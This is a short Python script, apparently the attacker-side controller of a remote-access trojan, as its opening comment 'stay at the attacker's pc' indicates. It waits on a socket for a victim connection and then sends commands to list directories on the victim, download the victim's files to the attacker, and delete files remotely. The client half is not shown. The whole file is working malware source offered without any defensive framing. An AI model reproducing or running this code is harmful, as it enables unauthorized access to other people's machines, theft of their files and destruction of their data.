# this is going to saty at the attacker's pc

import os
import socket

s = socket.socket()
host = socket.gethostname()
port = 8080
s.bind((host, port))
print("Server is running at {}".format(host))
print("Waiting for any incoming connections....")
s.listen(1)
conn, addr = s.accept()
print("{} Has connected to the server successfully".format(addr))

# connection has been established


# command handling

while 1:
    print("")
    command = input(str("Command >> "))
    if command == "view_cwd":
        conn.send(command.encode())
        print('Command Sent waiting for execution...')
        files=conn.recv(5000)
        files=files.decode()
        print("Command output : ",files)
    elif command=="custom_dir":
        conn.send(command.encode())
        user_input=input("Custom Dir: ")
        conn.send(user_input.encode())
        print("Command sent waiting for execution")
        files=conn.recv(5000)
        files=files.decode()
        print("Custom Dir Results : ",files)
    elif command=="download_file":
        conn.send(command.encode())
        filepath= input(str("Please enter the file path including the file path :"))
        conn.send(filepath.encode())
        file=conn.recv(100000)
        filename=input("Please enter the file namme for incoming file including the extension :")
        new_file=open(filename,"wb")
        new_file.write(file)
        new_file.close()
        print("{} has been downloaded successfully and saved".format(filename))
    elif command=="remove_file":
        conn.send(command.encode())
        file_path=input(str("Please enter the file path with filename and extension :"))
        conn.send(file_path.encode())
        print(" File has been removed successfully ")

    else:
        print("Command not recognized")    
   